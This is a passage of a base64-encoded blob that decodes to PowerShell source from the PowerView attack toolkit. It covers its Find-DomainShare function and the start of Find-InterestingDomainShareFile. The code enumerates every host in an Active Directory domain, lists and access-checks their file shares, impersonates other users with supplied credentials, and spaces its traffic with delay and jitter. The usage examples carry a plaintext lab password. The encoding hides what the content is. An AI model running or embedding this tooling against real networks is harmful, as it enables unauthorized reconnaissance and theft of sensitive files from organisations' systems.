3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKRmluZC1Eb21haW5TaGFyZSAtRG9tYWluIHRlc3RsYWIubG9jYWwgLUNyZWRlbnRpYWwgJENyZWQKClNlYXJjaGVzIGZvciBkb21haW4gc2hhcmVzIGluIHRoZSB0ZXN0bGFiLmxvY2FsIGRvbWFpbiB1c2luZyB0aGUgc3BlY2lmaWVkIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5PVVRQVVRTCgpQb3dlclZpZXcuU2hhcmVJbmZvCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuU2hhcmVJbmZvJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0ROU0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW4nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckRvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckxEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnT3BlcmF0aW5nU3lzdGVtJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTZXJ2aWNlUGFjaycpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2VydmljZVBhY2ssCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTaXRlTmFtZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2l0ZU5hbWUsCgogICAgICAgIFtBbGlhcygnQ2hlY2tBY2Nlc3MnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRDaGVja1NoYXJlQWNjZXNzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMC4wLCAxLjApXQogICAgICAgIFtEb3VibGVdCiAgICAgICAgJEppdHRlciA9IC4zLAoKICAgICAgICBbSW50XQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMCldCiAgICAgICAgJFRocmVhZHMgPSAyMAogICAgKQoKICAgIEJFR0lOIHsKCiAgICAgICAgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnZG5zaG9zdG5hbWUnCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyRG9tYWluJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJENvbXB1dGVyRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckxEQVBGaWx0ZXInXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJENvbXB1dGVyTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZWFyY2hCYXNlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRDb21wdXRlclNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VuY29uc3RyYWluZWQnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snVW5jb25zdHJhaW5lZCddID0gJFVuY29uc3RyYWluZWQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyT3BlcmF0aW5nU3lzdGVtJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ09wZXJhdGluZ1N5c3RlbSddID0gJE9wZXJhdGluZ1N5c3RlbSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZXJ2aWNlUGFjayddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2aWNlUGFjayddID0gJFNlcnZpY2VQYWNrIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNpdGVOYW1lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NpdGVOYW1lJ10gPSAkU2l0ZU5hbWUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck5hbWUnXSkgewogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gJENvbXB1dGVyTmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0ZpbmQtRG9tYWluU2hhcmVdIFF1ZXJ5aW5nIGNvbXB1dGVycyBpbiB0aGUgZG9tYWluJwogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gR2V0LURvbWFpbkNvbXB1dGVyIEBDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgZG5zaG9zdG5hbWUKICAgICAgICB9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluU2hhcmVdIFRhcmdldENvbXB1dGVycyBsZW5ndGg6ICQoJFRhcmdldENvbXB1dGVycy5MZW5ndGgpIgogICAgICAgIGlmICgkVGFyZ2V0Q29tcHV0ZXJzLkxlbmd0aCAtZXEgMCkgewogICAgICAgICAgICB0aHJvdyAnW0ZpbmQtRG9tYWluU2hhcmVdIE5vIGhvc3RzIGZvdW5kIHRvIGVudW1lcmF0ZScKICAgICAgICB9CgogICAgICAgICMgdGhlIGhvc3QgZW51bWVyYXRpb24gYmxvY2sgd2UncmUgdXNpbmcgdG8gZW51bWVyYXRlIGFsbCBzZXJ2ZXJzCiAgICAgICAgJEhvc3RFbnVtQmxvY2sgPSB7CiAgICAgICAgICAgIFBhcmFtKCRDb21wdXRlck5hbWUsICRDaGVja1NoYXJlQWNjZXNzLCAkVG9rZW5IYW5kbGUpCgogICAgICAgICAgICBpZiAoJFRva2VuSGFuZGxlKSB7CiAgICAgICAgICAgICAgICAjIGltcGVyc29uYXRlIHRoZSB0aGUgdG9rZW4gcHJvZHVjZWQgYnkgTG9nb25Vc2VyKCkvSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uCiAgICAgICAgICAgICAgICAkTnVsbCA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtVG9rZW5IYW5kbGUgJFRva2VuSGFuZGxlIC1RdWlldAogICAgICAgICAgICB9CgogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAgICAgJFVwID0gVGVzdC1Db25uZWN0aW9uIC1Db3VudCAxIC1RdWlldCAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgaWYgKCRVcCkgewogICAgICAgICAgICAgICAgICAgICMgZ2V0IHRoZSBzaGFyZXMgZm9yIHRoaXMgaG9zdCBhbmQgY2hlY2sgd2hhdCB3ZSBmaW5kCiAgICAgICAgICAgICAgICAgICAgJFNoYXJlcyA9IEdldC1OZXRTaGFyZSAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRTaGFyZSBpbiAkU2hhcmVzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTaGFyZU5hbWUgPSAkU2hhcmUuTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAjICRSZW1hcmsgPSAkU2hhcmUuUmVtYXJrCiAgICAgICAgICAgICAgICAgICAgICAgICRQYXRoID0gJ1xcJyskVGFyZ2V0Q29tcHV0ZXIrJ1wnKyRTaGFyZU5hbWUKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoJFNoYXJlTmFtZSkgLWFuZCAoJFNoYXJlTmFtZS50cmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzZWUgaWYgd2Ugd2FudCB0byBjaGVjayBhY2Nlc3MgdG8gdGhpcyBzaGFyZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRDaGVja1NoYXJlQWNjZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBjaGVjayBpZiB0aGUgdXNlciBoYXMgYWNjZXNzIHRvIHRoaXMgcGF0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROdWxsID0gW0lPLkRpcmVjdG9yeV06OkdldEZpbGVzKCRQYXRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2hhcmUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFcnJvciBhY2Nlc3Npbmcgc2hhcmUgcGF0aCAkUGF0aCA6ICRfIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTaGFyZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFRva2VuSGFuZGxlKSB7CiAgICAgICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRMb2dvblRva2VuID0gJE51bGwKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtUXVpZXQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAjIG9ubHkgaWdub3JlIHRocmVhZGluZyBpZiAtRGVsYXkgaXMgcGFzc2VkCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblNoYXJlXSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6ICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblNoYXJlXSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXIiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICAkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCgogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXIgaW4gJFRhcmdldENvbXB1dGVycykgewogICAgICAgICAgICAgICAgJENvdW50ZXIgPSAkQ291bnRlciArIDEKCiAgICAgICAgICAgICAgICAjIHNsZWVwIGZvciBvdXIgc2VtaS1yYW5kb21pemVkIGludGVydmFsCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkUmFuZE5vLk5leHQoKDEtJEppdHRlcikqJERlbGF5LCAoMSskSml0dGVyKSokRGVsYXkpCgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluU2hhcmVdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkpIgogICAgICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1Bcmd1bWVudExpc3QgJFRhcmdldENvbXB1dGVyLCAkQ2hlY2tTaGFyZUFjY2VzcywgJExvZ29uVG9rZW4KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluU2hhcmVdIFVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHM6ICRUaHJlYWRzIgoKICAgICAgICAgICAgIyBpZiB3ZSdyZSB1c2luZyB0aHJlYWRpbmcsIGtpY2sgb2ZmIHRoZSBzY3JpcHQgYmxvY2sgd2l0aCBOZXctVGhyZWFkZWRGdW5jdGlvbgogICAgICAgICAgICAkU2NyaXB0UGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICdDaGVja1NoYXJlQWNjZXNzJyA9ICRDaGVja1NoYXJlQWNjZXNzCiAgICAgICAgICAgICAgICAnVG9rZW5IYW5kbGUnID0gJExvZ29uVG9rZW4KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBpZiB3ZSdyZSB1c2luZyB0aHJlYWRpbmcsIGtpY2sgb2ZmIHRoZSBzY3JpcHQgYmxvY2sgd2l0aCBOZXctVGhyZWFkZWRGdW5jdGlvbiB1c2luZyB0aGUgJEhvc3RFbnVtQmxvY2sgKyBwYXJhbXMKICAgICAgICAgICAgTmV3LVRocmVhZGVkRnVuY3Rpb24gLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXJzIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtU2NyaXB0UGFyYW1ldGVycyAkU2NyaXB0UGFyYW1zIC1UaHJlYWRzICRUaHJlYWRzCiAgICAgICAgfQogICAgfQoKICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gRmluZC1JbnRlcmVzdGluZ0RvbWFpblNoYXJlRmlsZSB7CjwjCi5TWU5PUFNJUwoKU2VhcmNoZXMgZm9yIGZpbGVzIG1hdGNoaW5nIHNwZWNpZmljIGNyaXRlcmlhIG9uIHJlYWRhYmxlIHNoYXJlcwppbiB0aGUgZG9tYWluLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluQ29tcHV0ZXIsIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiwgSW52b2tlLVJldmVydFRvU2VsZiwgR2V0LU5ldFNoYXJlLCBGaW5kLUludGVyZXN0aW5nRmlsZSwgTmV3LVRocmVhZGVkRnVuY3Rpb24gIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIGVudW1lcmF0ZXMgYWxsIG1hY2hpbmVzIG9uIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbgp1c2luZyBHZXQtRG9tYWluQ29tcHV0ZXIsIGFuZCBlbnVtZXJhdGVzIHRoZSBhdmFpbGFibGUgc2hhcmVzIGZvciBlYWNoCm1hY2hpbmUgd2l0aCBHZXQtTmV0U2hhcmUuIEl0IHdpbGwgdGhlbiB1c2UgRmluZC1JbnRlcmVzdGluZ0ZpbGUgb24gZWFjaApyZWFkaGFibGUgc2hhcmUsIHNlYXJjaGluZyBmb3IgZmlsZXMgbWFyY2hpbmcgc3BlY2lmaWMgY3JpdGVyaWEuIElmIC1DcmVkZW50aWFsCmlzIHBhc3NlZCwgdGhlbiBJbnZva2UtVXNlckltcGVyc29uYXRpb24gaXMgdXNlZCB0byBpbXBlcnNvbmF0ZSB0aGUgc3BlY2lmaWVkCnVzZXIgYmVmb3JlIGVudW1lcmF0aW9uLCByZXZlcnRpbmcgYWZ0ZXIgd2l0aCBJbnZva2UtUmV2ZXJ0VG9TZWxmLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyBhbiBhcnJheSBvZiBvbmUgb3IgbW9yZSBob3N0cyB0byBlbnVtZXJhdGUsIHBhc3NhYmxlIG9uIHRoZSBwaXBlbGluZS4KSWYgLUNvbXB1dGVyTmFtZSBpcyBub3QgcGFzc2VkLCB0aGUgZGVmYXVsdCBiZWhhdmlvciBpcyB0byBlbnVtZXJhdGUgYWxsIG1hY2hpbmVzCmluIHRoZSBkb21haW4gcmV0dXJuZWQgYnkgR2V0LURvbWFpbkNvbXB1dGVyLgoKLlBBUkFNRVRFUiBDb21wdXRlckRvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gcXVlcnkgZm9yIGNvbXB1dGVycywgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBDb21wdXRlckxEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gc2VhcmNoIGZvciBjb21wdXRlciBvYmplY3RzLgoKLlBBUkFNRVRFUiBDb21wdXRlclNlYXJjaEJhc2UKClNwZWNpZmllcyB0aGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2ggZm9yIGNvbXB1dGVycywKZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIi4gVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBDb21wdXRlck9wZXJhdGluZ1N5c3RlbQoKU2VhcmNoIGNvbXB1dGVycyB3aXRoIGEgc3BlY2lmaWMgb3BlcmF0aW5nIHN5c3RlbSwgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBDb21wdXRlclNlcnZpY2VQYWNrCgpTZWFyY2ggY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBzZXJ2aWNlIHBhY2ssIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgQ29tcHV0ZXJTaXRlTmFtZQoKU2VhcmNoIGNvbXB1dGVycyBpbiB0aGUgc3BlY2lmaWMgQUQgU2l0ZSBuYW1lLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIEluY2x1ZGUKCk9ubHkgcmV0dXJuIGZpbGVzL2ZvbGRlcnMgdGhhdCBtYXRjaCB0aGUgc3BlY2lmaWVkIGFycmF5IG9mIHN0cmluZ3MsCmkuZS4gQCgqLmRvYyosICoueGxzKiwgKi5wcHQqKQoKLlBBUkFNRVRFUiBTaGFyZVBhdGgKClNwZWNpZmllcyBvbmUgb3IgbW9yZSBzcGVjaWZpYyBzaGFyZSBwYXRocyB0byBzZWFyY2gsIGluIHRoZSBmb3JtIFxcQ09NUFVURVJcU2hhcmUKCi5QQVJBTUVURVIgRXhjbHVkZWRTaGFyZXMKClNwZWNpZmllcyBzaGFyZSBwYXRocyB0byBleGNsdWRlLCBkZWZhdWx0IG9mIEMkLCBBZG1pbiQsIFByaW50JCwgSVBDJC4KCi5QQVJBTUVURVIgTGFzdEFjY2Vzc1RpbWUKCk9ubHkgcmV0dXJuIGZpbGVzIHdpdGggYSBMYXN0QWNjZXNzVGltZSBncmVhdGVyIHRoYW4gdGhpcyBkYXRlIHZhbHVlLgoKLlBBUkFNRVRFUiBMYXN0V3JpdGVUaW1lCgpPbmx5IHJldHVybiBmaWxlcyB3aXRoIGEgTGFzdFdyaXRlVGltZSBncmVhdGVyIHRoYW4gdGhpcyBkYXRlIHZhbHVlLgoKLlBBUkFNRVRFUiBDcmVhdGlvblRpbWUKCk9ubHkgcmV0dXJuIGZpbGVzIHdpdGggYSBDcmVhdGlvblRpbWUgZ3JlYXRlciB0aGFuIHRoaXMgZGF0ZSB2YWx1ZS4KCi5QQVJBTUVURVIgT2ZmaWNlRG9jcwoKU3dpdGNoLiBTZWFyY2ggZm9yIG9mZmljZSBkb2N1bWVudHMgKCouZG9jKiwgKi54bHMqLCAqLnBwdCopCgouUEFSQU1FVEVSIEZyZXNoRVhFcwoKU3dpdGNoLiBGaW5kIC5FWEVzIGFjY2Vzc2VkIHdpdGhpbiB0aGUgbGFzdCA3IGRheXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyIGZvciBjb21wdXRlcnMsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4gYW5kIHRhcmdldCBzeXN0ZW1zLgoKLlBBUkFNRVRFUiBEZWxheQoKU3BlY2lmaWVzIHRoZSBkZWxheSAoaW4gc2Vjb25kcykgYmV0d2VlbiBlbnVtZXJhdGluZyBob3N0cywgZGVmYXVsdHMgdG8gMC4KCi5QQVJBTUVURVIgSml0dGVyCgpTcGVjaWZpZXMgdGhlIGppdHRlciAoMC0xLjApIHRvIGFwcGx5IHRvIGFueSBzcGVjaWZpZWQgLURlbGF5LCBkZWZhdWx0cyB0byArLy0gMC4zCgouUEFSQU1FVEVSIFRocmVhZHMKClRoZSBudW1iZXIgb2YgdGhyZWFkcyB0byB1c2UgZm9yIHVzZXIgc2VhcmNoaW5nLCBkZWZhdWx0cyB0byAyMC4KCi5FWEFNUExFCgpGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlCgpGaW5kcyAnaW50ZXJlc3RpbmcnIGZpbGVzIG9uIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlIC1Db21wdXRlck5hbWUgQCgnd2luZG93czEudGVzdGxhYi5sb2NhbCcsJ3dpbmRvd3MyLnRlc3RsYWIubG9jYWwnKQoKRmluZHMgJ2ludGVyZXN0aW5nJyBmaWxlcyBvbiByZWFkYWJsZSBzaGFyZXMgb24gdGhlIHNwZWNpZmllZCBzeXN0ZW1zLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ0RFVlxkZm0uYScsICRTZWNQYXNzd29yZCkKRmluZC1Eb21haW5TaGFyZSAtRG9tYWluIHRlc3RsYWIubG9jYWwgLUNyZWRlbnRpYWwgJENyZWQKClNlYXJjaGVzIGludGVyZXN0aW5nIGZpbGVzIGluIHRoZSB0ZXN0bGFiLmxvY2FsIGRvbWFpbiB1c2luZyB0aGUgc3BlY2lmaWVkIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5PVVRQVV